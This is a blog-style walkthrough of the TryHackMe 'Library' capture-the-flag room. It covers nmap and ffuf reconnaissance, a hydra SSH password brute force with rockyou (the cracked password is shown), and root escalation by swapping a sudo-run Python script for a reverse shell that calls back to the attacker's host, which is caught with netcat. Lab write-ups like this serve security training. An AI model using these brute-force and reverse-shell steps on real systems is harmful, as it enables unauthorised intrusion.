---
layout: page
title: Library
description: SSH hydra brute-force.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/library/logo.jpg" title="THM Library Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/bsidesgtlibrary">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Library was made for BSides Guatemala CTF.  Fair enough.

Let's run nmap to get a list of the services running on top ports.

{% raw %}
```bash
root@ip-10-10-22-36:~# sudo nmap -sV -sC -O -A -oN nmap 10.10.11.208
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 11:31 GMT
Nmap scan report for 10.10.11.208
Host is up (0.00045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
MAC Address: 02:50:6E:3C:E3:7D (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 10.10.11.208

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds
```
{% endraw %}

<br />
Run nmap's vuln category scripts.  I like to look for low-hangin fruit.  Why not?

{% raw %}
```bash
root@ip-10-10-22-36:~# nmap --script vuln -oN vulnchk 10.10.11.208
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 11:32 GMT
Nmap scan report for 10.10.11.208
Host is up (0.00046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.208
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.11.208:80/
|     Form id: name
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 02:50:6E:3C:E3:7D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 321.82 seconds
```
{% endraw %}

<br />
Whenever I see a web server, I like to curl -I to pull the headers and maybe identify some technologies.

{% raw %}
```bash
root@ip-10-10-22-36:~# curl -I 10.10.11.208
HTTP/1.1 200 OK
Date: Mon, 10 Mar 2025 11:38:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 24 Aug 2019 21:04:28 GMT
ETag: "153f-590e344b14f00"
Accept-Ranges: bytes
Content-Length: 5439
Vary: Accept-Encoding
Content-Type: text/html
```
{% endraw %}

<br />
Check the landing page the webserver is serving.  Library was made for BSides Guatemala.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/library/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page.  Might find some interesting comments or something.  Worth a checky-check.

{% raw %}
```html
view-source:http://10.10.11.208/

<!doctype html>
<html lang="en">
<head>
	<title>Welcome to  Blog - Library Machine</title>
	<link rel="stylesheet" href="master.css" type="text/css" media="screen" />
</head>
<body>

<snip>

			<form action="#" method="post">
				<h3>Post a comment</h3>
				<p>
					<label for="name">Name</label>
					<input name="name" id="name" type="text" required />
				</p>
				<p>
					<label for="email">E-mail</label>
					<input name="email" id="email" type="email" required />
				</p>
				<p>
					<label for="website">Website</label>
					<input name="website" id="website" type="url" />
				</p>
				<p>
					<label for="comment">Comment</label>
					<textarea name="comment" id="comment" required></textarea>
				</p>
				<p><input type="submit" value="Post comment" /></p>
			</form>
		</div>
	</div>
	<footer>
		<div>
		</div>
	</footer>
</body>
</html>
```
{% endraw %}

<br />
And, of course, give the robots.txt a lookey-loo.

{% raw %}
```bash
http://10.10.11.208/robots.txt

User-agent: rockyou 
Disallow: /
```
{% endraw %}

<br />
Check the images directory from the vulnchk just because we can.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/library/images.png" title="Images Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Give the web server a ffuf to see what we have available to us.

{% raw %}
```bash
root@ip-10-10-22-36:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.208/FUZZ -e .txt,.bak,.html -fs 5439

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.208/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 5439
________________________________________________

images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 292, Words: 22, Lines: 12]
robots.txt              [Status: 200, Size: 33, Words: 4, Lines: 2]
.html                   [Status: 403, Size: 292, Words: 22, Lines: 12]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]
:: Progress: [882240/882240] :: Job [1/1] :: 10508 req/sec :: Duration: [0:02:32] :: Errors: 0 ::
```
{% endraw %}

<br />
Now, if we take the name from the post in the landing page screenshot (meliodas) and using the rockyou, since it mentioned it in the robots.txt, we can use hydra against the ssh port that is also open.

{% raw %}
```bash
root@ip-10-10-188-166:~# hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.208 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-10 12:01:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.11.208:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344354 to do in 5433:29h, 4 active
[STATUS] 33.33 tries/min, 100 tries in 00:03h, 14344298 to do in 7172:09h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344194 to do in 8203:23h, 4 active
[22][ssh] host: 10.10.11.208   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 12:09:19
```
{% endraw %}

<br />
And with that, we can now ssh into the machine.

{% raw %}
```bash
root@ip-10-10-188-166:~# ssh meliodas@10.10.11.208
The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.208' (ECDSA) to the list of known hosts.
meliodas@10.10.11.208's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$
```
{% endraw %}

<br />
Let's snag the user.txt flag.

{% raw %}
```bash
meliodas@ubuntu:~$ cat user.txt
<redacted>
meliodas@ubuntu:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:50:6e:3c:e3:7d brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.208/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::50:6eff:fe3c:e37d/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Time to run the sudo -l to see the command this user can run as sudo.

{% raw %}
```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
{% endraw %}

<br />
Ls the home directory to see what we are working with.

{% raw %}
```bash
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```
{% endraw %}

<br />
Cat the python file that was indicated in the sudo command.

{% raw %}
```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
{% endraw %}

<br />
Try running the script with the sudo.  Why not.

{% raw %}
```bash
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
meliodas@ubuntu:~$ ls /var/backups
apt.extended_states.0  website.zip
meliodas@ubuntu:~$ ls -la /var/backups/
total 56
drwxr-xr-x  2 root root  4096 Aug 24  2019 .
drwxr-xr-x 12 root root  4096 Aug 24  2019 ..
-rw-r--r--  1 root root 15347 Aug 24  2019 apt.extended_states.0
-rw-r--r--  1 root root 31089 Mar 10 05:26 website.zip
```
{% endraw %}

<br />
Remove the bak.py file.

{% raw %}
```bash
meliodas@ubuntu:~$ rm -rvf bak.py 
removed 'bak.py'
```
{% endraw %}

<br />
Use the revshells to generate the a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/library/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Create a bak.py file that replaces the one that we deleted earlier.  The file should contain the code from the revshells.

{% raw %}
```python
import socket,subprocess,os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.188.166",443))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/bash")
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
root@ip-10-10-188-166:~# sudo nc -nlvp 443
Listening on 0.0.0.0 443
```
{% endraw %}

<br />
Execute the script.

{% raw %}
```bash
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
root@ip-10-10-188-166:~# sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.78.155 36788
root@ubuntu:~#
```
{% endraw %}

<br />
Finally, grab the root trophy.

{% raw %}
```bash
root@ubuntu:~# cat /root/root.txt
cat /root/root.txt
<redacted>
root@ubuntu:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:80:25:de:e9:9b brd ff:ff:ff:ff:ff:ff
    inet 10.10.78.155/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::80:25ff:fede:e99b/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
So, looks like no overdue fee for us since we cracked the library.  Hopefully, you enjoyed it.  See you in the next one.